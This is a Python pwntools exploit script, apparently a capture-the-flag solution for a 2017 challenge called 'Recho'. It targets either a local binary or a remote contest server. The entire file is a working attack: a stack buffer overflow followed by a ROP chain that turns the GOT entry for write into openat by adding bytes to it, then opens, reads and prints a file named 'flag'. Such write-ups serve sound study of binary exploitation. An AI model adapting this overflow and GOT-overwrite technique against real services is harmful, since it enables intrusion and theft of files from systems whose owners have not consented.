#!/usr/bin/env python2
from pwn import *
import sys

if __name__ == '__main__':
    if len(sys.argv) == 1:
        s = process(["./Recho"])
    else:
        s = remote("recho.2017.teamrois.cn",9527)

    read_plt = 0x400600
    write_plt = 0x4005d0
    write_got = 0x601018
    write_offset = 0xf66d0
    openat_offset = 0xf6510
    add_rdi_al = 0x40070d
    pop_rdi = 0x4008a3
    pop_rax = 0x4006fc
    pop_rdx = 0x4006fe
    pop_rsi_r15 = 0x4008a1
    bss_addr = 0x601060
    payload = ""
    payload += "A" * 0x38

    # write -> openat
    payload += p64(pop_rdi) + p64(write_got)
    payload += p64(pop_rax) + p64(0x40)
    payload += p64(add_rdi_al)
    payload += p64(pop_rdi) + p64(write_got+1)
    payload += p64(pop_rax) + p64(0xff)
    payload += p64(add_rdi_al)

    # openat
    payload += p64(pop_rdi) + p64(0xffffff9c)
    payload += p64(pop_rdx) + p64(0)
    payload += p64(write_plt)

    # openat -> write
    payload += p64(pop_rdi) + p64(write_got)
    payload += p64(pop_rax) + p64(0xc0)
    payload += p64(add_rdi_al)
    payload += p64(pop_rdi) + p64(write_got+1)
    payload += p64(pop_rax) + p64(1)
    payload += p64(add_rdi_al)

    # read
    payload += p64(pop_rdi) + p64(3)
    payload += p64(pop_rsi_r15) + p64(bss_addr) + "A" * 8
    payload += p64(pop_rdx) + p64(0x100)
    payload += p64(read_plt)

    # write
    payload += p64(pop_rdi) + p64(1)
    payload += p64(write_plt)

    s.send(str(len(payload)))
    s.send(payload)
    s.send("flag")
    s.shutdown()
    s.recvuntil("AX")
    print s.recvline()
